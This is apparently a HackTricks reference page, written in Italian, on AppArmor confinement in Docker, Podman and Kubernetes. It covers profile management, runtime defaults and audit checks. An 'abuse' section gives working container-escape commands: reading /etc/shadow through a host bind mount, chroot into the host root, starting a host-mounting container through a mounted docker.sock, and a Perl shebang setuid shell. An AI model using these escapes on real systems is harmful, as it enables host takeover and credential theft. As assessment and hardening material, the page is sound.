# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **Controllo degli accessi obbligatorio** che applica restrizioni tramite profili per singolo programma. Diversamente dai tradizionali controlli DAC, che dipendono fortemente dalla proprietà utente e di gruppo, AppArmor consente al kernel di far rispettare una policy associata direttamente al processo. Negli ambienti containerizzati questo è importante perché un carico di lavoro potrebbe avere privilegi tradizionali sufficienti per tentare un'azione eppure essere negato perché il suo profilo AppArmor non permette il percorso, il mount, il comportamento di rete o l'uso di una capability pertinente.

Il punto concettuale più importante è che AppArmor è **basato sui percorsi**. Valuta l'accesso al filesystem tramite regole sui percorsi piuttosto che tramite etichette come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mounts e layout di percorsi alternativi meritano attenzione. Se lo stesso contenuto dell'host diventa raggiungibile tramite un percorso diverso, l'effetto della policy potrebbe non essere quello che l'operatore si aspettava inizialmente.

## Ruolo nell'isolamento dei container

Le revisioni della sicurezza dei container spesso si fermano a capabilities e seccomp, ma AppArmor rimane importante anche dopo questi controlli. Immagina un container che ha più privilegi del dovuto, o un carico di lavoro che ha richiesto una capability in più per motivi operativi. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, la rete e i modelli di esecuzione in modi che bloccano le vie di abuso più ovvie. Per questo disabilitare AppArmor "solo per far funzionare l'applicazione" può trasformare silenziosamente una configurazione rischiosa in una che è attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Per vedere sotto quale utente è in esecuzione il processo corrente del container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor legato al profilo scelto dal runtime. Nel caso unconfined, quello strato di restrizione aggiuntivo scompare.

Puoi anche ispezionare ciò che Docker ritiene di aver applicato:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso a runtime

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può anch'esso integrarsi con AppArmor nei sistemi basati su AppArmor, sebbene nelle distribuzioni orientate a SELinux sia quest'altro sistema MAC a prevalere. Kubernetes può esporre policy AppArmor a livello di workload sui nodi che effettivamente supportano AppArmor. LXC e gli ambienti system-container della famiglia Ubuntu utilizzano anch'essi AppArmor in modo esteso.

Il punto pratico è che AppArmor non è una "Docker feature". È una funzionalità del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non la supporta o al runtime viene detto di eseguire in modalità unconfined, la presunta protezione non è realmente presente.

Per Kubernetes nello specifico, l'API moderna è `securityContext.appArmorProfile`. Da Kubernetes `v1.30`, le vecchie annotation beta di AppArmor sono deprecate. Su host che lo supportano, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` punta a un profilo che deve essere già caricato sul nodo. Questo è importante durante le review perché un manifest può apparire consapevole di AppArmor pur dipendendo interamente dal supporto lato nodo e dai profili pre-caricati.

Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più restrittivo rispetto al semplice omettere il campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'admission dovrebbe fallire. Se il campo è omesso, il workload può comunque girare su un nodo senza AppArmor e semplicemente non ricevere quel livello di confinamento aggiuntivo. Dal punto di vista di un attacker, questo è un buon motivo per controllare sia il manifest sia lo stato reale del nodo.

Su host AppArmor compatibili con Docker, il default più noto è `docker-default`. Quel profilo viene generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoCs basati su capability falliscono ancora in un container di default. In termini generali, `docker-default` permette il networking ordinario, nega le scritture a gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e limita ptrace in modo che non sia una primitiva generale per sondare l'host. Capire questa baseline aiuta a distinguere "il container ha `CAP_SYS_ADMIN`" da "il container può effettivamente usare quella capability contro le interfacce del kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono solitamente memorizzati sotto `/etc/apparmor.d/`. Una convenzione di nomenclatura comune è sostituire gli slash nel percorso dell'eseguibile con dei punti. Per esempio, un profilo per `/usr/bin/man` è comunemente salvato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia in fase di difesa che di assessment perché una volta noto il nome del profilo attivo, spesso è possibile trovare rapidamente il file corrispondente sull'host.

Comandi utili per la gestione lato host includono:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La ragione per cui questi comandi sono importanti in un riferimento su container-security è che spiegano come i profili vengono effettivamente creati, caricati, passati in complain mode e modificati dopo cambiamenti dell'applicazione. Se un operatore ha l'abitudine di spostare i profili in complain mode durante il troubleshooting e dimentica di ripristinare l'enforcement, il container può apparire protetto nella documentazione mentre in realtà si comporta in modo molto più permissivo.

### Creazione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento dell'applicazione e aiutare a generare un profilo in modo interattivo:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` può generare un profilo modello che può poi essere caricato con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i dinieghi trovati nei log e aiutare l'operatore a decidere se consentirli o negarli:
```bash
sudo aa-logprof
```
### Registri

I blocchi di AppArmor sono spesso visibili tramite `auditd`, syslog, o strumenti come `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Questo è utile a livello operativo e offensivo. I difensori lo usano per perfezionare i profili. Gli attaccanti lo usano per capire quale percorso o operazione esatta viene negata e se AppArmor è il controllo che blocca una catena di exploit.

### Identificazione del file di profilo esatto

Quando un runtime mostra un nome di profilo AppArmor specifico per un container, è spesso utile mappare quel nome al file di profilo su disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container dice di essere in esecuzione con il profilo `lowpriv`" e "le regole effettive risiedono in questo file specifico che può essere sottoposto ad audit o ricaricato".

### Regole più significative da verificare

Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole modificano sostanzialmente l'efficacia di AppArmor contro un tentativo di escape dal container:

- `ux` / `Ux`: esegue il binario target senza confinamento. Se un helper, shell o interpreter raggiungibile è consentito sotto `ux`, quello è di solito il primo elemento da testare.
- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo su exec. Non sono automaticamente pericolose, ma valgono un audit perché una transizione può portare in un profilo molto più permissivo di quello corrente.
- `change_profile`: permette a un task di passare a un altro profilo caricato, immediatamente o al prossimo exec. Se il profilo di destinazione è più debole, questo può diventare la via di fuga prevista da un dominio restrittivo.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: questi dovrebbero modificare il livello di fiducia nel profilo. `complain` registra i rifiuti invece di applicarli, `unconfined` rimuove il confine, e `prompt` dipende da un percorso decisionale in userspace anziché da un deny imposto dal kernel.
- `userns` or `userns create,`: le policy AppArmor più recenti possono mediare la creazione di user namespaces. Se un profilo container lo permette esplicitamente, i nested user namespaces rimangono in gioco anche quando la piattaforma usa AppArmor come parte della sua strategia di hardening.

Grep utile sul host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Questo tipo di audit è spesso più utile che fissare centinaia di normali regole sui file. Se un breakout dipende dall'esecuzione di un helper, dall'entrare in un nuovo namespace o dall'uscire in un profilo meno restrittivo, la risposta si nasconde spesso in queste regole orientate alla transizione piuttosto che nelle ovvie righe dello stile `deny /etc/shadow r`.

## Configurazioni errate

L'errore più ovvio è `apparmor=unconfined`. Gli amministratori spesso lo impostano durante il debug di un'applicazione che è fallita perché il profilo ha correttamente bloccato qualcosa di pericoloso o inatteso. Se il flag rimane in produzione, l'intero layer MAC è effettivamente rimosso.

Un altro problema sottile è presumere che i bind mounts siano innocui perché le autorizzazioni dei file sembrano normali. Poiché AppArmor è basato sui percorsi, esporre percorsi dell'host sotto punti di mount alternativi può interagire male con le regole basate sui percorsi. Un terzo errore è dimenticare che un nome di profilo in un file di configurazione significa molto poco se il kernel host non sta effettivamente facendo rispettare AppArmor.

## Abuso

Quando AppArmor non c'è più, operazioni precedentemente vincolate possono improvvisamente funzionare: leggere percorsi sensibili tramite bind mount, accedere a parti di procfs o sysfs che sarebbero dovute rimanere più difficili da usare, eseguire azioni legate ai mount se anche capabilities/seccomp lo permettono, o usare percorsi che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato su capability "dovrebbe funzionare" sulla carta ma fallisce nella pratica. Rimuovi AppArmor, e lo stesso tentativo potrebbe iniziare a riuscire.

Se sospetti che AppArmor sia la principale cosa che impedisce una catena di abuso basata su path-traversal, bind-mount o mount, il primo passo è di solito confrontare ciò che diventa accessibile con e senza un profilo. Per esempio, se un percorso dell'host è montato all'interno del container, inizia controllando se puoi attraversarlo e leggerlo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se il container ha anche una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici è verificare se AppArmor è il controllo che blocca le operazioni di mount o l'accesso a filesystem sensibili del kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Negli ambienti in cui un host path è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di divulgazione di informazioni in sola lettura in un accesso diretto ai file dell'host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Lo scopo di questi comandi non è che AppArmor da solo crea il breakout. È che una volta rimosso AppArmor, molti percorsi di abuso basati su filesystem e mount diventano immediatamente testabili.

### Esempio completo: AppArmor disabilitato + root dell'host montata

Se il container ha già la root dell'host bind-mounted in `/host`, rimuovere AppArmor può trasformare un percorso di abuso del filesystem bloccato in una completa host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una volta che la shell viene eseguita attraverso il filesystem dell'host, il workload ha effettivamente superato il confine del container:
```bash
id
hostname
cat /etc/shadow | head
```
### Esempio completo: AppArmor disabilitato + Runtime Socket

Se la vera barriera era AppArmor intorno allo stato runtime, una socket montata può essere sufficiente per una escape completa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Il percorso esatto dipende dal mount point, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso alla runtime API, e la runtime API può avviare un container che compromette l'host.

### Esempio completo: bypass dei bind-mount basato sul percorso

Poiché AppArmor è basato sui percorsi, proteggere `/proc/**` non protegge automaticamente lo stesso contenuto procfs dell'host quando è raggiungibile tramite un percorso diverso:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impatto dipende da cosa viene effettivamente montato e se il percorso alternativo aggira anche altri controlli, ma questo schema è uno dei motivi più evidenti per cui AppArmor deve essere valutato insieme al layout di mount anziché in isolamento.

### Esempio completo: Shebang Bypass

La policy AppArmor a volte prende di mira il percorso di un interprete in modo che non tenga pienamente conto dell'esecuzione di script tramite la gestione degli shebang. Un esempio storico coinvolgeva l'uso di uno script la cui prima riga punta a un interprete confinato:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Questo tipo di esempio è importante come promemoria che l'intento del profilo e la semantica effettiva di esecuzione possono divergere. Quando si esamina AppArmor negli ambienti container, le catene di interpreti e i percorsi alternativi di esecuzione meritano particolare attenzione.

## Verifiche

L'obiettivo di queste verifiche è rispondere rapidamente a tre domande: AppArmor è abilitato sull'host, il processo corrente è confinato, e il runtime ha effettivamente applicato un profilo a questo container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ciò che è interessante qui:

- Se `/proc/self/attr/current` mostra `unconfined`, il carico di lavoro non beneficia del confinement di AppArmor.
- Se `aa-status` mostra AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella configurazione del runtime è per lo più cosmetico.
- Se `docker inspect` mostra `unconfined` o un profilo custom inaspettato, quello è spesso il motivo per cui un percorso di abuso basato su filesystem o mount funziona.
- Se `/sys/kernel/security/apparmor/profiles` non contiene il profilo che ti aspettavi, la configurazione del runtime o dell'orchestrator non è sufficiente da sola.
- Se un profilo presumibilmente hardenizzato contiene `ux`, ampie regole `change_profile`, `userns`, o regole nello stile `flags=(complain)`, il confine pratico può essere molto più debole di quanto suggerisca il nome del profilo.

Se un container ha già privilegi elevati per motivi operativi, lasciare AppArmor abilitato spesso fa la differenza tra un'eccezione controllata e un fallimento di sicurezza molto più ampio.

## Valori predefiniti del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita su host con supporto AppArmor | Usa il profilo AppArmor `docker-default` a meno che non sia sovrascritto | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dipende dall'host | AppArmor è supportato tramite `--security-opt`, ma il default esatto dipende dall'host/runtime ed è meno universale rispetto al profilo `docker-default` documentato per Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predefinito condizionale | Se `appArmorProfile.type` non è specificato, il default è `RuntimeDefault`, ma viene applicato solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto AppArmor |
| containerd / CRI-O under Kubernetes | Segue il supporto nodo/runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'enforcement effettivo dipende comunque dal supporto del nodo e dalle impostazioni del workload | Stesso della riga Kubernetes; la configurazione diretta del runtime può anche saltare completamente AppArmor |

Per AppArmor, la variabile più importante è spesso l'host, non solo il runtime. Una impostazione di profilo in un manifesto non crea confinamento su un nodo dove AppArmor non è abilitato.

## Riferimenti

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
